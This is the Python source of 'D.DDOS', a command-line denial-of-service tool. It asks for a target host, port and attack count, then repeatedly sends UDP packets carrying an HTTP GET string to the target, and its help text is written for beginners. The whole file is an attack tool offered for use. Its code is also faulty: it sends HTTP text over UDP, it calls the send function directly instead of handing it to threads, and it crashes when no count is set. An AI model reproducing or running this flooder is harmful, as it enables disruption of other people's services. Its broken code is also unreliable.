import os
import socket
import string
import random
import threading
from colorama import Fore, Back, Style

class SockFlood:
	def __init__(self):
		os.system("cls")
		os.system("title D.DDOS - An Advance DDOS Tool ")
		self.host=None
		self.portnum=None
		self.threads=None

	def graphics(self):
		banner="""

                     
                     

                                                                                                             
                                                                                                             
DDDDDDDDDDDDD                DDDDDDDDDDDDD        DDDDDDDDDDDDD             OOOOOOOOO        SSSSSSSSSSSSSSS 
D::::::::::::DDD             D::::::::::::DDD     D::::::::::::DDD        OO:::::::::OO    SS:::::::::::::::S
D:::::::::::::::DD           D:::::::::::::::DD   D:::::::::::::::DD    OO:::::::::::::OO S:::::SSSSSS::::::S
DDD:::::DDDDD:::::D          DDD:::::DDDDD:::::D  DDD:::::DDDDD:::::D  O:::::::OOO:::::::OS:::::S     SSSSSSS
  D:::::D    D:::::D           D:::::D    D:::::D   D:::::D    D:::::D O::::::O   O::::::OS:::::S            
  D:::::D     D:::::D          D:::::D     D:::::D  D:::::D     D:::::DO:::::O     O:::::OS:::::S            
  D:::::D     D:::::D          D:::::D     D:::::D  D:::::D     D:::::DO:::::O     O:::::O S::::SSSS         
  D:::::D     D:::::D          D:::::D     D:::::D  D:::::D     D:::::DO:::::O     O:::::O  SS::::::SSSSS    
  D:::::D     D:::::D          D:::::D     D:::::D  D:::::D     D:::::DO:::::O     O:::::O    SSS::::::::SS  
  D:::::D     D:::::D          D:::::D     D:::::D  D:::::D     D:::::DO:::::O     O:::::O       SSSSSS::::S 
  D:::::D     D:::::D          D:::::D     D:::::D  D:::::D     D:::::DO:::::O     O:::::O            S:::::S
  D:::::D    D:::::D           D:::::D    D:::::D   D:::::D    D:::::D O::::::O   O::::::O            S:::::S
DDD:::::DDDDD:::::D          DDD:::::DDDDD:::::D  DDD:::::DDDDD:::::D  O:::::::OOO:::::::OSSSSSSS     S:::::S
D:::::::::::::::DD    ...... D:::::::::::::::DD   D:::::::::::::::DD    OO:::::::::::::OO S::::::SSSSSS:::::S
D::::::::::::DDD      .::::. D::::::::::::DDD     D::::::::::::DDD        OO:::::::::OO   S:::::::::::::::SS 
DDDDDDDDDDDDD         ...... DDDDDDDDDDDDD        DDDDDDDDDDDDD             OOOOOOOOO      SSSSSSSSSSSSSSS   
                                                                                                             
                                                                                                             
                                                                                                             
                                                                                                             
                                                                                                             
                                                                                                             
                                                                                                             
 
                     
                     
                     
                     
                     
                     
                     
  
		"""
		print(Fore.RED+banner)
		print(Fore.YELLOW+"""
		[+] An Advance DDOS Tool Using Sockets Written in Python [+]"""+Fore.GREEN+"""
		[+] Developer : ⋆ D#0552 [ """+Fore.WHITE+"""s1ralt ]""")
		print(Fore.WHITE+"""
		[+] Type `help` If You Are A Beginner [+]
			""")

	def start_attack(self,host,port=None):
		self.sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
		try:
			url_path=str(string.ascii_letters + string.digits + string.punctuation)
			byt = (f"GET /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()
			if not port:
				self.sock.sendto(byt,(host,80))
			elif port:
				self.sock.sendto(byt,(host,int(port)))
			print(Fore.WHITE+"""[+] Sent Byte Successfully""")
		except Exception as e:
			print(Fore.RED+f"""
	[-] Socket ERROR! Fatal X_X
	[-] EXCEPTION : {e}
						""")

	def command_parser(self,command):
		if command=="help":
			print(Fore.WHITE+"""
	Welcome To D.DDOS Help Menu - 

	(+) host %HOST% - Enter the Host Domain or Ip Address [!Required]
	(+) port %PORT% - Enter a custom port if you have, or just don't use it will use port 80
	(+) attacks %AMOUNT% - Enter a custom amount of attack, Default 1000
	(+) start - Will start attacking and display outputs on console
	""")
		if "host " in command:
			self.host=command.replace("host ","").replace("https://", "").replace("http://", "").replace("www.", "")
			print(Fore.WHITE+f"""
	[+] Successfully Set Host as {self.host}
				""")
		elif "port " in command:
			self.portnum=command.replace("port ","")
			print(Fore.WHITE+f"""
	[+] Successfully Set Port to {self.portnum}
				""")
		elif command=="start":
			print(self.portnum)
			if self.host and self.portnum:
				if int(self.threads):
					for i in range(1,int(self.threads)):
						threading.Thread(target=self.start_attack(self.host,self.portnum)).start()
				else:
					for i in range(1,1000):
						threading.Thread(target=self.start_attack(self.host,self.portnum)).start()
			elif self.host and not self.portnum:
				if int(self.threads):
					for i in range(1,int(self.threads)):
						threading.Thread(target=self.start_attack(self.host)).start()
				else:
					for i in range(1,1000):
						threading.Thread(target=self.start_attack(self.host)).start()
		elif "attacks " in command:
			self.threads=command.replace("attacks ","")
			print(Fore.WHITE+f"""
	[+] Successfully Set Threads to {self.threads}
				""")

	def run(self):
		self.graphics()
		while True:
			self.command_parser(input(Fore.CYAN+f"${os.environ.get('USERNAME')}$>> "))

if __name__=="__main__":
	app=SockFlood()
	app.run()